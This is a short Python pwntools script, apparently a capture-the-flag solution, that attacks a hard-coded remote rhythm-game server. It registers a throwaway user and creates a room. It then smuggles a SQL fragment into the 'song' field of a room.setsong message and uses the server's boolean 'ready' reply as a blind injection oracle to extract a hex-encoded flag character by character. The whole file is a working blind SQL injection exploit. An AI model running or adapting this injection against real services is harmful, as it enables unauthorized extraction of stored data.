from pwn import *
import random
import json

def get_char(curr):
  p = remote("34.234.204.29", 39079)

  def send(topic, args):
    args["topic"] = topic

    p.sendline("\x01" + json.dumps(args))
   

  p.recvuntil("server.rooms")
  print("Got server rooms")

  send("user.auth", {
    "name": "USER" + str(random.random()),
    "password": "AAAAA" + str(random.random()),
    "version": "v0.19"
  })

  p.recvuntil("server.info")
  send("server.room.new", {
    "name": "ROOM NAME",
    "password": "PASSWORD"
  })

  p.recvuntil("server.room.joined")
  p.recvuntil("room.update")

  def test(val):
    send("room.setsong", {
      "song": "flag%\" AND hex(effector) LIKE \"" + val + "%\" -- ",
      "diff": 0,
      "level": 231,
      "hash": "A" * 0x8,
      "audio_hash": "B" * 0x8,
      "chart_hash": "C" * 0x8
    })

    p.recvuntil("room.update")
    p.recvuntil("room.update")

    p.recvuntil("itszn")
    p.recvuntil("ready\":")

    leak = p.recvline().split("}")[0].strip()
    return leak == "true"

  charset = "0123456789"
  for i in range(26):
    charset += chr(ord("a") + i)
    charset += chr(ord("A") + i)

  for i in charset:
    stmt = curr
    stmt += i
    if test(stmt):
      print(curr + i)
      return i

curr = "666c61677b6576656e20632b2b206973206e6f7420736166652066726f6d2073716c6"
for i in range(100):
  curr += get_char(curr)

